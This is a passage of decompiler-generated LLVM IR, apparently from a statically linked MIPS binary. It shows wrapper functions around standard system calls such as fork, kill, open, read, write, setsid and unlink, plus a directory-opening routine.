  br label %dec_label_pc_404d04

dec_label_pc_404d04:                              ; preds = %dec_label_pc_404cc0, %dec_label_pc_404cec
  %v0_404d04 = phi i32 [ %v3_404ce0, %dec_label_pc_404cc0 ], [ -1, %dec_label_pc_404cec ]
  ret i32 %v0_404d04

; uselistorder directives
  uselistorder label %dec_label_pc_404d04, { 1, 0 }
}

define i32 @function_404d20(i32 %arg1) local_unnamed_addr {
dec_label_pc_404d20:
  %s0.global-to-local = alloca i32, align 4
  %v1_404d40 = call i32 @close(i32 %arg1)
  %v3_404d44 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404d44, i32* @t9, align 4
  %v0_404d48 = load i32, i32* @a3, align 4
  %v1_404d48 = icmp eq i32 %v0_404d48, 0
  store i32 %v1_404d40, i32* %s0.global-to-local, align 4
  br i1 %v1_404d48, label %dec_label_pc_404d64, label %dec_label_pc_404d4c

dec_label_pc_404d4c:                              ; preds = %dec_label_pc_404d20
  %v1_404d50 = call i32 @function_4056e0()
  %v0_404d5c = load i32, i32* %s0.global-to-local, align 4
  %v2_404d5c = inttoptr i32 %v1_404d50 to i32*
  store i32 %v0_404d5c, i32* %v2_404d5c, align 4
  br label %dec_label_pc_404d64

dec_label_pc_404d64:                              ; preds = %dec_label_pc_404d20, %dec_label_pc_404d4c
  %v4_404d6c = phi i32 [ %v1_404d40, %dec_label_pc_404d20 ], [ -1, %dec_label_pc_404d4c ]
  ret i32 %v4_404d6c

; uselistorder directives
  uselistorder label %dec_label_pc_404d64, { 1, 0 }
}

define i32 @function_404d80() local_unnamed_addr {
dec_label_pc_404d80:
  %s0.global-to-local = alloca i32, align 4
  %v0_404da0 = call i32 @fork()
  %v3_404da4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404da4, i32* @t9, align 4
  %v0_404da8 = load i32, i32* @a3, align 4
  %v1_404da8 = icmp eq i32 %v0_404da8, 0
  store i32 %v0_404da0, i32* %s0.global-to-local, align 4
  br i1 %v1_404da8, label %dec_label_pc_404dc4, label %dec_label_pc_404dac

dec_label_pc_404dac:                              ; preds = %dec_label_pc_404d80
  %v1_404db0 = call i32 @function_4056e0()
  %v0_404dbc = load i32, i32* %s0.global-to-local, align 4
  %v2_404dbc = inttoptr i32 %v1_404db0 to i32*
  store i32 %v0_404dbc, i32* %v2_404dbc, align 4
  br label %dec_label_pc_404dc4

dec_label_pc_404dc4:                              ; preds = %dec_label_pc_404d80, %dec_label_pc_404dac
  %v4_404dcc = phi i32 [ %v0_404da0, %dec_label_pc_404d80 ], [ -1, %dec_label_pc_404dac ]
  ret i32 %v4_404dcc

; uselistorder directives
  uselistorder label %dec_label_pc_404dc4, { 1, 0 }
}

define i32 @function_404de0() local_unnamed_addr {
dec_label_pc_404de0:
  %stack_var_-16 = alloca i32, align 4
  %v3_404df8 = load i32, i32* @global_var_449b58.178, align 4
  store i32 %v3_404df8, i32* @t9, align 4
  %v6_404e00 = bitcast i32* %stack_var_-16 to %rlimit*
  %v7_404e00 = call i32 @function_404ef0(i32 5, %rlimit* %v6_404e00)
  %v1_404e0c = icmp slt i32 %v7_404e00, 0
  br i1 %v1_404e0c, label %dec_label_pc_404e18, label %dec_label_pc_404e10

dec_label_pc_404e10:                              ; preds = %dec_label_pc_404de0
  %v3_404e14 = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_404e18

dec_label_pc_404e18:                              ; preds = %dec_label_pc_404de0, %dec_label_pc_404e10
  %v0_404e1c = phi i32 [ 256, %dec_label_pc_404de0 ], [ %v3_404e14, %dec_label_pc_404e10 ]
  ret i32 %v0_404e1c

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder label %dec_label_pc_404e18, { 1, 0 }
}

define i32 @function_404e30() local_unnamed_addr {
dec_label_pc_404e30:
  %s0.global-to-local = alloca i32, align 4
  %v0_404e50 = call i32 @getpid()
  %v3_404e54 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404e54, i32* @t9, align 4
  %v0_404e58 = load i32, i32* @a3, align 4
  %v1_404e58 = icmp eq i32 %v0_404e58, 0
  store i32 %v0_404e50, i32* %s0.global-to-local, align 4
  br i1 %v1_404e58, label %dec_label_pc_404e74, label %dec_label_pc_404e5c

dec_label_pc_404e5c:                              ; preds = %dec_label_pc_404e30
  %v1_404e60 = call i32 @function_4056e0()
  %v0_404e6c = load i32, i32* %s0.global-to-local, align 4
  %v2_404e6c = inttoptr i32 %v1_404e60 to i32*
  store i32 %v0_404e6c, i32* %v2_404e6c, align 4
  br label %dec_label_pc_404e74

dec_label_pc_404e74:                              ; preds = %dec_label_pc_404e30, %dec_label_pc_404e5c
  %v4_404e7c = phi i32 [ %v0_404e50, %dec_label_pc_404e30 ], [ -1, %dec_label_pc_404e5c ]
  ret i32 %v4_404e7c

; uselistorder directives
  uselistorder label %dec_label_pc_404e74, { 1, 0 }
}

define i32 @function_404e90() local_unnamed_addr {
dec_label_pc_404e90:
  %s0.global-to-local = alloca i32, align 4
  %v0_404eb0 = call i32 @getppid()
  %v3_404eb4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404eb4, i32* @t9, align 4
  %v0_404eb8 = load i32, i32* @a3, align 4
  %v1_404eb8 = icmp eq i32 %v0_404eb8, 0
  store i32 %v0_404eb0, i32* %s0.global-to-local, align 4
  br i1 %v1_404eb8, label %dec_label_pc_404ed4, label %dec_label_pc_404ebc

dec_label_pc_404ebc:                              ; preds = %dec_label_pc_404e90
  %v1_404ec0 = call i32 @function_4056e0()
  %v0_404ecc = load i32, i32* %s0.global-to-local, align 4
  %v2_404ecc = inttoptr i32 %v1_404ec0 to i32*
  store i32 %v0_404ecc, i32* %v2_404ecc, align 4
  br label %dec_label_pc_404ed4

dec_label_pc_404ed4:                              ; preds = %dec_label_pc_404e90, %dec_label_pc_404ebc
  %v4_404edc = phi i32 [ %v0_404eb0, %dec_label_pc_404e90 ], [ -1, %dec_label_pc_404ebc ]
  ret i32 %v4_404edc

; uselistorder directives
  uselistorder label %dec_label_pc_404ed4, { 1, 0 }
}

define i32 @function_404ef0(i32 %arg1, %rlimit* %arg2) local_unnamed_addr {
dec_label_pc_404ef0:
  %s0.global-to-local = alloca i32, align 4
  %v4_404f10 = call i32 @getrlimit(i32 %arg1, %rlimit* %arg2)
  %v3_404f14 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404f14, i32* @t9, align 4
  %v0_404f18 = load i32, i32* @a3, align 4
  %v1_404f18 = icmp eq i32 %v0_404f18, 0
  store i32 %v4_404f10, i32* %s0.global-to-local, align 4
  br i1 %v1_404f18, label %dec_label_pc_404f34, label %dec_label_pc_404f1c

dec_label_pc_404f1c:                              ; preds = %dec_label_pc_404ef0
  %v1_404f20 = call i32 @function_4056e0()
  %v0_404f2c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f2c = inttoptr i32 %v1_404f20 to i32*
  store i32 %v0_404f2c, i32* %v2_404f2c, align 4
  br label %dec_label_pc_404f34

dec_label_pc_404f34:                              ; preds = %dec_label_pc_404ef0, %dec_label_pc_404f1c
  %v4_404f3c = phi i32 [ %v4_404f10, %dec_label_pc_404ef0 ], [ -1, %dec_label_pc_404f1c ]
  ret i32 %v4_404f3c

; uselistorder directives
  uselistorder label %dec_label_pc_404f34, { 1, 0 }
}

define i32 @function_404f50(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_404f50:
  %s0.global-to-local = alloca i32, align 4
  %v2_404f70 = call i32 @kill(i32 %arg1, i32 %arg2)
  %v3_404f74 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404f74, i32* @t9, align 4
  %v0_404f78 = load i32, i32* @a3, align 4
  %v1_404f78 = icmp eq i32 %v0_404f78, 0
  store i32 %v2_404f70, i32* %s0.global-to-local, align 4
  br i1 %v1_404f78, label %dec_label_pc_404f94, label %dec_label_pc_404f7c

dec_label_pc_404f7c:                              ; preds = %dec_label_pc_404f50
  %v1_404f80 = call i32 @function_4056e0()
  %v0_404f8c = load i32, i32* %s0.global-to-local, align 4
  %v2_404f8c = inttoptr i32 %v1_404f80 to i32*
  store i32 %v0_404f8c, i32* %v2_404f8c, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_404f94

dec_label_pc_404f94:                              ; preds = %dec_label_pc_404f50, %dec_label_pc_404f7c
  %v0_404f94 = phi i32 [ %v2_404f70, %dec_label_pc_404f50 ], [ -1, %dec_label_pc_404f7c ]
  ret i32 %v0_404f94

; uselistorder directives
  uselistorder label %dec_label_pc_404f94, { 1, 0 }
}

define i32 @function_404fb0(i8* %arg1) local_unnamed_addr {
dec_label_pc_404fb0:
  %s0.global-to-local = alloca i32, align 4
  %v0_404fcc = load i32, i32* @a1, align 4
  %v1_404fcc = and i32 %v0_404fcc, 256
  %v1_404fd8 = icmp eq i32 %v1_404fcc, 0
  br i1 %v1_404fd8, label %dec_label_pc_404fec, label %dec_label_pc_404fdc

dec_label_pc_404fdc:                              ; preds = %dec_label_pc_404fb0
  br label %dec_label_pc_404fec

dec_label_pc_404fec:                              ; preds = %dec_label_pc_404fb0, %dec_label_pc_404fdc
  %v4_404ff4 = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v0_404fcc)
  %v3_404ff8 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_404ff8, i32* @t9, align 4
  %v0_404ffc = load i32, i32* @a3, align 4
  %v1_404ffc = icmp eq i32 %v0_404ffc, 0
  store i32 %v4_404ff4, i32* %s0.global-to-local, align 4
  br i1 %v1_404ffc, label %dec_label_pc_405018, label %dec_label_pc_405000

dec_label_pc_405000:                              ; preds = %dec_label_pc_404fec
  %v1_405004 = call i32 @function_4056e0()
  %v0_405010 = load i32, i32* %s0.global-to-local, align 4
  %v2_405010 = inttoptr i32 %v1_405004 to i32*
  store i32 %v0_405010, i32* %v2_405010, align 4
  store i32 -1, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_405018

dec_label_pc_405018:                              ; preds = %dec_label_pc_404fec, %dec_label_pc_405000
  %v0_405018 = phi i32 [ %v4_404ff4, %dec_label_pc_404fec ], [ -1, %dec_label_pc_405000 ]
  ret i32 %v0_405018

; uselistorder directives
  uselistorder label %dec_label_pc_405018, { 1, 0 }
  uselistorder label %dec_label_pc_404fec, { 1, 0 }
}

define i32 @function_40502c(i32 %arg1) local_unnamed_addr {
dec_label_pc_40502c:
  %v3_405038 = load i32, i32* @global_var_4499d4.179, align 4
  store i32 %v3_405038, i32* @t9, align 4
  store i32 %arg1, i32* @a2, align 4
  store i32 769, i32* @a1, align 4
  %v3_405040 = call i32 @function_404fb0(i8* inttoptr (i32 769 to i8*))
  ret i32 %v3_405040
}

define i32 @function_405050(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405050:
  %s0.global-to-local = alloca i32, align 4
  %v0.global-to-local = alloca i32, align 4
  store i32 4003, i32* %v0.global-to-local, align 4
  %v4_405070 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v4_405070, i32* %v0.global-to-local, align 4
  %v3_405074 = load i32, i32* @global_var_449abc.83, align 4
  %v0_405078 = load i32, i32* @a3, align 4
  %v1_405078 = icmp eq i32 %v0_405078, 0
  store i32 %v4_405070, i32* %s0.global-to-local, align 4
  br i1 %v1_405078, label %dec_label_pc_405094, label %dec_label_pc_40507c

dec_label_pc_40507c:                              ; preds = %dec_label_pc_405050
  call void @__pseudo_call(i32 %v3_405074)
  %v0_40508c = load i32, i32* %s0.global-to-local, align 4
  %v1_40508c = load i32, i32* %v0.global-to-local, align 4
  %v2_40508c = inttoptr i32 %v1_40508c to i32*
  store i32 %v0_40508c, i32* %v2_40508c, align 4
  store i32 -1, i32* %v0.global-to-local, align 4
  br label %dec_label_pc_405094

dec_label_pc_405094:                              ; preds = %dec_label_pc_405050, %dec_label_pc_40507c
  %v4_40509c = phi i32 [ %v4_405070, %dec_label_pc_405050 ], [ -1, %dec_label_pc_40507c ]
  ret i32 %v4_40509c

; uselistorder directives
  uselistorder i32* %v0.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_405094, { 1, 0 }
}

define i32 @function_4050b0(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_4050b0:
  %s0.global-to-local = alloca i32, align 4
  %tmp = inttoptr i32 %arg2 to i8*
  %v7_4050d0 = call i32 @readlink(i8* %arg1, i8* %tmp, i32 %arg3)
  %v3_4050d4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4050d4, i32* @t9, align 4
  %v1_4050d8 = icmp eq i32 %arg4, 0
  store i32 %v7_4050d0, i32* %s0.global-to-local, align 4
  br i1 %v1_4050d8, label %dec_label_pc_4050f4, label %dec_label_pc_4050dc

dec_label_pc_4050dc:                              ; preds = %dec_label_pc_4050b0
  %v1_4050e0 = call i32 @function_4056e0()
  %v0_4050ec = load i32, i32* %s0.global-to-local, align 4
  %v2_4050ec = inttoptr i32 %v1_4050e0 to i32*
  store i32 %v0_4050ec, i32* %v2_4050ec, align 4
  br label %dec_label_pc_4050f4

dec_label_pc_4050f4:                              ; preds = %dec_label_pc_4050b0, %dec_label_pc_4050dc
  %v4_4050fc = phi i32 [ %v7_4050d0, %dec_label_pc_4050b0 ], [ -1, %dec_label_pc_4050dc ]
  ret i32 %v4_4050fc

; uselistorder directives
  uselistorder label %dec_label_pc_4050f4, { 1, 0 }
}

define i32 @function_405110(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405110:
  %s0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @a3, align 4
  %v3_405150 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405150, i32* @t9, align 4
  %v1_405154 = icmp eq i32 %arg1, 0
  store i32 4142, i32* %s0.global-to-local, align 4
  br i1 %v1_405154, label %dec_label_pc_405170, label %dec_label_pc_405158

dec_label_pc_405158:                              ; preds = %dec_label_pc_405110
  %v1_40515c = call i32 @function_4056e0()
  %v0_405168 = load i32, i32* %s0.global-to-local, align 4
  %v2_405168 = inttoptr i32 %v1_40515c to i32*
  store i32 %v0_405168, i32* %v2_405168, align 4
  br label %dec_label_pc_405170

dec_label_pc_405170:                              ; preds = %dec_label_pc_405110, %dec_label_pc_405158
  %v4_405180 = phi i32 [ 4142, %dec_label_pc_405110 ], [ -1, %dec_label_pc_405158 ]
  ret i32 %v4_405180

; uselistorder directives
  uselistorder label %dec_label_pc_405170, { 1, 0 }
}

define i32 @function_405190() local_unnamed_addr {
dec_label_pc_405190:
  %s0.global-to-local = alloca i32, align 4
  %v0_4051b0 = call i32 @setsid()
  %v3_4051b4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4051b4, i32* @t9, align 4
  %v0_4051b8 = load i32, i32* @a3, align 4
  %v1_4051b8 = icmp eq i32 %v0_4051b8, 0
  store i32 %v0_4051b0, i32* %s0.global-to-local, align 4
  br i1 %v1_4051b8, label %dec_label_pc_4051d4, label %dec_label_pc_4051bc

dec_label_pc_4051bc:                              ; preds = %dec_label_pc_405190
  %v1_4051c0 = call i32 @function_4056e0()
  %v0_4051cc = load i32, i32* %s0.global-to-local, align 4
  %v2_4051cc = inttoptr i32 %v1_4051c0 to i32*
  store i32 %v0_4051cc, i32* %v2_4051cc, align 4
  br label %dec_label_pc_4051d4

dec_label_pc_4051d4:                              ; preds = %dec_label_pc_405190, %dec_label_pc_4051bc
  %v4_4051dc = phi i32 [ %v0_4051b0, %dec_label_pc_405190 ], [ -1, %dec_label_pc_4051bc ]
  ret i32 %v4_4051dc

; uselistorder directives
  uselistorder label %dec_label_pc_4051d4, { 1, 0 }
}

define i32 @function_4051f0(i32* %arg1) local_unnamed_addr {
dec_label_pc_4051f0:
  %s0.global-to-local = alloca i32, align 4
  %v2_405210 = call i32 @time(i32* %arg1)
  %v3_405214 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405214, i32* @t9, align 4
  %v0_405218 = load i32, i32* @a3, align 4
  %v1_405218 = icmp eq i32 %v0_405218, 0
  store i32 %v2_405210, i32* %s0.global-to-local, align 4
  br i1 %v1_405218, label %dec_label_pc_405234, label %dec_label_pc_40521c

dec_label_pc_40521c:                              ; preds = %dec_label_pc_4051f0
  %v1_405220 = call i32 @function_4056e0()
  %v0_40522c = load i32, i32* %s0.global-to-local, align 4
  %v2_40522c = inttoptr i32 %v1_405220 to i32*
  store i32 %v0_40522c, i32* %v2_40522c, align 4
  br label %dec_label_pc_405234

dec_label_pc_405234:                              ; preds = %dec_label_pc_4051f0, %dec_label_pc_40521c
  %v4_40523c = phi i32 [ %v2_405210, %dec_label_pc_4051f0 ], [ -1, %dec_label_pc_40521c ]
  ret i32 %v4_40523c

; uselistorder directives
  uselistorder label %dec_label_pc_405234, { 1, 0 }
}

define i32 @function_405250(i8* %arg1) local_unnamed_addr {
dec_label_pc_405250:
  %s0.global-to-local = alloca i32, align 4
  %v3_405270 = call i32 @unlink(i8* %arg1)
  %v3_405274 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405274, i32* @t9, align 4
  %v0_405278 = load i32, i32* @a3, align 4
  %v1_405278 = icmp eq i32 %v0_405278, 0
  store i32 %v3_405270, i32* %s0.global-to-local, align 4
  br i1 %v1_405278, label %dec_label_pc_405294, label %dec_label_pc_40527c

dec_label_pc_40527c:                              ; preds = %dec_label_pc_405250
  %v1_405280 = call i32 @function_4056e0()
  %v0_40528c = load i32, i32* %s0.global-to-local, align 4
  %v2_40528c = inttoptr i32 %v1_405280 to i32*
  store i32 %v0_40528c, i32* %v2_40528c, align 4
  br label %dec_label_pc_405294

dec_label_pc_405294:                              ; preds = %dec_label_pc_405250, %dec_label_pc_40527c
  %v4_40529c = phi i32 [ %v3_405270, %dec_label_pc_405250 ], [ -1, %dec_label_pc_40527c ]
  ret i32 %v4_40529c

; uselistorder directives
  uselistorder label %dec_label_pc_405294, { 1, 0 }
}

define i32 @function_4052b0(i32 %arg1, i32* %arg2) local_unnamed_addr {
dec_label_pc_4052b0:
  %s0.global-to-local = alloca i32, align 4
  %v3_4052d0 = load i32, i32* @a2, align 4
  %v4_4052d0 = call i32 @write(i32 %arg1, i32* %arg2, i32 %v3_4052d0)
  %v3_4052d4 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4052d4, i32* @t9, align 4
  %v0_4052d8 = load i32, i32* @a3, align 4
  %v1_4052d8 = icmp eq i32 %v0_4052d8, 0
  store i32 %v4_4052d0, i32* %s0.global-to-local, align 4
  br i1 %v1_4052d8, label %dec_label_pc_4052f4, label %dec_label_pc_4052dc

dec_label_pc_4052dc:                              ; preds = %dec_label_pc_4052b0
  %v1_4052e0 = call i32 @function_4056e0()
  %v0_4052ec = load i32, i32* %s0.global-to-local, align 4
  %v2_4052ec = inttoptr i32 %v1_4052e0 to i32*
  store i32 %v0_4052ec, i32* %v2_4052ec, align 4
  br label %dec_label_pc_4052f4

dec_label_pc_4052f4:                              ; preds = %dec_label_pc_4052b0, %dec_label_pc_4052dc
  %v4_4052fc = phi i32 [ %v4_4052d0, %dec_label_pc_4052b0 ], [ -1, %dec_label_pc_4052dc ]
  ret i32 %v4_4052fc

; uselistorder directives
  uselistorder label %dec_label_pc_4052f4, { 1, 0 }
}

define i32 @function_405310(i32* %arg1) local_unnamed_addr {
dec_label_pc_405310:
  %s0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_405330 = load i32, i32* @s0, align 4
  store i32 %tmp, i32* @s1, align 4
  %v3_40533c = load i32, i32* @global_var_449b38.180, align 4
  %v2_405340 = load i32, i32* %arg1, align 4
  %v1_405344 = add i32 %tmp, 24
  store i32 %v1_405344, i32* %s0.global-to-local, align 4
  %v2_405348 = ptrtoint i32* %stack_var_-40 to i32
  store i32 -1, i32* @s2, align 4
  store i32 %v3_40533c, i32* %v1.global-to-local, align 4
  %v3_40535c = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_40535c, i32* @t9, align 4
  %v2_405360 = icmp eq i32 %v2_405340, -1
  br i1 %v2_405360, label %dec_label_pc_405364, label %dec_label_pc_405384

dec_label_pc_405364:                              ; preds = %dec_label_pc_405310
  %v1_405368 = call i32 @function_4056e0()
  store i32 9, i32* %v1.global-to-local, align 4
  %v2_405380 = inttoptr i32 %v1_405368 to i32*
  store i32 9, i32* %v2_405380, align 4
  %v0_405384.pre = load i32, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_405384

dec_label_pc_405384:                              ; preds = %dec_label_pc_405310, %dec_label_pc_405364
  %v0_405384 = phi i32 [ %v3_40533c, %dec_label_pc_405310 ], [ %v0_405384.pre, %dec_label_pc_405364 ]
  store i32 4215696, i32* @ra, align 4
  call void @__pseudo_call(i32 %v0_405384)
  %v1_4053a0 = load i32, i32* %s0.global-to-local, align 4
  %v3_4053a0 = call i32 @function_406da4(i32 %v1_4053a0)
  store i32 %v3_4053a0, i32* @v0, align 4
  %v0_4053b4 = load i32, i32* @s1, align 4
  %v1_4053b4 = inttoptr i32 %v0_4053b4 to i32*
  %v2_4053b4 = load i32, i32* %v1_4053b4, align 4
  store i32 %v2_4053b4, i32* @s0, align 4
  %v1_4053bc = load i32, i32* @s2, align 4
  store i32 %v1_4053bc, i32* %v1_4053b4, align 4
  %v6_4053bc = call i32 @function_406dac(i32 %v2_405348, i32 1)
  %v0_4053c8 = load i32, i32* @s1, align 4
  %v1_4053c8 = add i32 %v0_4053c8, 12
  %v2_4053c8 = inttoptr i32 %v1_4053c8 to i32*
  %v3_4053c8 = load i32, i32* %v2_4053c8, align 4
  %v3_4053cc = load i32, i32* @global_var_449a64.128, align 4
  store i32 %v3_4053cc, i32* @t9, align 4
  %v2_4053d4 = call i32 @function_4063f0(i32 %v3_4053c8)
  %v3_4053e4 = load i32, i32* @global_var_449a64.128, align 4
  store i32 %v3_4053e4, i32* @t9, align 4
  %v1_4053ec = load i32, i32* @s1, align 4
  %v3_4053ec = call i32 @function_4063f0(i32 %v1_4053ec)
  %v3_4053fc = load i32, i32* @global_var_4499d8.184, align 4
  store i32 %v3_4053fc, i32* @t9, align 4
  %v1_405404 = load i32, i32* @s0, align 4
  %v3_405404 = call i32 @function_404d20(i32 %v1_405404)
  store i32 %v0_405330, i32* %s0.global-to-local, align 4
  ret i32 %v3_405404

; uselistorder directives
  uselistorder i32 9, { 2, 5, 3, 4, 6, 7, 1, 8, 0 }
  uselistorder label %dec_label_pc_405384, { 1, 0 }
}

define i32 @function_405440() local_unnamed_addr {
dec_label_pc_405440:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  %v3_405464 = load i32, i32* @global_var_4499d4.179, align 4
  store i32 %v3_405464, i32* @t9, align 4
  store i32 65664, i32* @a1, align 4
  %v5_40546c = call i32 @function_404fb0(i8* inttoptr (i32 65664 to i8*))
  %v1_405478 = icmp sgt i32 %v5_40546c, -1
  store i32 %v5_40546c, i32* @s0, align 4
  br i1 %v1_405478, label %dec_label_pc_405488, label %dec_label_pc_40547c

dec_label_pc_40547c:                              ; preds = %dec_label_pc_405440
  br label %dec_label_pc_405488

dec_label_pc_405488:                              ; preds = %dec_label_pc_405440, %dec_label_pc_40547c
  %v3_405488 = load i32, i32* @global_var_449acc.185, align 4
  store i32 %v3_405488, i32* @t9, align 4
  %v3_405490 = ptrtoint i32* %stack_var_-168 to i32
  %v6_405490 = call i32 @function_407430(i32 %v5_40546c, i32 %v3_405490)
  %v1_40549c = icmp slt i32 %v6_405490, 0
  %v2_40549c = load i32, i32* @s0, align 4
  store i32 %v2_40549c, i32* @a0, align 4
  br i1 %v1_40549c, label %dec_label_pc_4054c0, label %dec_label_pc_4054a0

dec_label_pc_4054a0:                              ; preds = %dec_label_pc_405488
  %v3_4054a4 = load i32, i32* @global_var_4499dc.186, align 4
  store i32 %v3_4054a4, i32* @t9, align 4
  store i32 2, i32* @a1, align 4
  %v1_4054ac = call i32 @function_404bc0()
  %v1_4054b8 = icmp sgt i32 %v1_4054ac, -1
  br i1 %v1_4054b8, label %dec_label_pc_4054f4, label %dec_label_pc_4054c0

dec_label_pc_4054c0:                              ; preds = %dec_label_pc_4054a0, %dec_label_pc_405488
  %v3_4054c0 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_4054c0, i32* @t9, align 4
  %v1_4054c8 = call i32 @function_4056e0()
  %v0_4054d4 = load i32, i32* @s0, align 4
  %v3_4054d8 = load i32, i32* @global_var_4499d8.184, align 4
  store i32 %v3_4054d8, i32* @t9, align 4
  %v1_4054dc = inttoptr i32 %v1_4054c8 to i32*
  %v2_4054dc = load i32, i32* %v1_4054dc, align 4
  store i32 %v2_4054dc, i32* @s0, align 4
  store i32 %v1_4054c8, i32* @s1, align 4
  %v3_4054e0 = call i32 @function_404d20(i32 %v0_4054d4)
  %v0_4054f0 = load i32, i32* @s0, align 4
  %v1_4054f0 = load i32, i32* @s1, align 4
  %v2_4054f0 = inttoptr i32 %v1_4054f0 to i32*
  store i32 %v0_4054f0, i32* %v2_4054f0, align 4
  br label %dec_label_pc_4054f4

dec_label_pc_4054f4:                              ; preds = %dec_label_pc_4054a0, %dec_label_pc_4054c0
  %v3_4054f4 = load i32, i32* @global_var_449c08.14, align 4
  store i32 %v3_4054f4, i32* @t9, align 4
  %v2_4054fc = call i32 @function_406140(i32 48)
  %v1_405508 = icmp eq i32 %v2_4054fc, 0
  store i32 %v2_4054fc, i32* @s2, align 4
  br i1 %v1_405508, label %dec_label_pc_405570, label %dec_label_pc_40550c

dec_label_pc_40550c:                              ; preds = %dec_label_pc_4054f4
  %v0_405510 = load i32, i32* @s0, align 4
  %v2_405510 = inttoptr i32 %v2_4054fc to i32*
  store i32 %v0_405510, i32* %v2_405510, align 4
  %v1_405514 = add i32 %v2_4054fc, 16
  %v2_405514 = inttoptr i32 %v1_405514 to i32*
  store i32 0, i32* %v2_405514, align 4
  %v1_405518 = add i32 %v2_4054fc, 8
  %v2_405518 = inttoptr i32 %v1_405518 to i32*
  store i32 0, i32* %v2_405518, align 4
  %v1_40551c = add i32 %v2_4054fc, 4
  %v2_40551c = inttoptr i32 %v1_40551c to i32*
  store i32 0, i32* %v2_40551c, align 4
  store i32 %tmp, i32* @v0, align 4
  %v1_405528 = icmp ult i32 %tmp, 512
  %v1_40552c = icmp eq i1 %v1_405528, false
  %v3_40552c = load i32, i32* @s2, align 4
  %v4_40552c = add i32 %v3_40552c, 20
  %v5_40552c = inttoptr i32 %v4_40552c to i32*
  store i32 %tmp, i32* %v5_40552c, align 4
  br i1 %v1_40552c, label %dec_label_pc_40553c, label %dec_label_pc_405530

dec_label_pc_405530:                              ; preds = %dec_label_pc_40550c
  store i32 512, i32* @v0, align 4
  %v1_405538 = load i32, i32* @s2, align 4
  %v2_405538 = add i32 %v1_405538, 20
  %v3_405538 = inttoptr i32 %v2_405538 to i32*
  store i32 512, i32* %v3_405538, align 4
  br label %dec_label_pc_40553c

dec_label_pc_40553c:                              ; preds = %dec_label_pc_40550c, %dec_label_pc_405530
  %v3_40553c = load i32, i32* @global_var_449bac.120, align 4
  store i32 %v3_40553c, i32* @t9, align 4
  %v0_405540 = load i32, i32* @s2, align 4
  %v1_405540 = add i32 %v0_405540, 20
  %v2_405540 = inttoptr i32 %v1_405540 to i32*
  %v3_405540 = load i32, i32* %v2_405540, align 4
  %v4_405544 = call i32 @function_406330(i64 1, i32 %v3_405540)
  %v1_405550 = icmp eq i32 %v4_405544, 0
  %v3_405550 = load i32, i32* @s2, align 4
  %v4_405550 = add i32 %v3_405550, 12
  %v5_405550 = inttoptr i32 %v4_405550 to i32*
  store i32 %v4_405544, i32* %v5_405550, align 4
  br i1 %v1_405550, label %dec_label_pc_405554, label %dec_label_pc_4055a8

dec_label_pc_405554:                              ; preds = %dec_label_pc_40553c
  %v3_405558 = load i32, i32* @global_var_449a64.128, align 4
  store i32 %v3_405558, i32* @t9, align 4
  %v1_405560 = load i32, i32* @s2, align 4
  %v3_405560 = call i32 @function_4063f0(i32 %v1_405560)
  br label %dec_label_pc_405570

dec_label_pc_405570:                              ; preds = %dec_label_pc_4054f4, %dec_label_pc_405554
  %v3_405570 = load i32, i32* @global_var_4499d8.184, align 4
  store i32 %v3_405570, i32* @t9, align 4
  %v1_405578 = load i32, i32* @s0, align 4
  %v3_405578 = call i32 @function_404d20(i32 %v1_405578)
  %v3_405588 = load i32, i32* @global_var_449abc.83, align 4
  store i32 %v3_405588, i32* @t9, align 4
  store i32 0, i32* @s2, align 4
  %v1_405590 = call i32 @function_4056e0()
  %v2_4055a4 = inttoptr i32 %v1_405590 to i32*
  store i32 12, i32* %v2_4055a4, align 4
  br label %dec_label_pc_4055a8

dec_label_pc_4055a8:                              ; preds = %dec_label_pc_40553c, %dec_label_pc_405570
  %v0_4055ac = load i32, i32* @s2, align 4
  %v1_4055ac = add i32 %v0_4055ac, 24
  %v2_4055b0 = call i32 @function_406da4(i32 %v1_4055ac)
  %v0_4055bc = load i32, i32* @s2, align 4
  ret i32 %v0_4055bc

; uselistorder directives
  uselistorder i32 %v1_4054c8, { 1, 0 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder i32 (i32)* @function_4063f0, { 3, 2, 1, 0 }
  uselistorder i32 (i64, i32)* @function_406330, { 0, 4, 1, 2, 3 }
  uselistorder i64 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @function_406140, { 3, 1, 2, 0 }
